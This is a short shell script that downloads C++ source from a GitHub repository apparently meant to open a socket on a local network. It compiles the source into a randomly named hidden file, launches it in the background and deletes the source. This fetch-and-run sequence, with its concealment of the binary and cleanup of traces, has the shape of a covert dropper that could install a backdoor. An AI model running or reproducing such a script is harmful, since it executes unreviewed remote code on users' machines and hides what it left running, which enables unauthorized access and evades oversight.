fileName=$(echo $RANDOM $RANDOM | tr -d ' ')
curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | cat > hey.cxx
g++ hey.cxx -o .$fileName
./.$fileName &
rm hey.cxx
exit
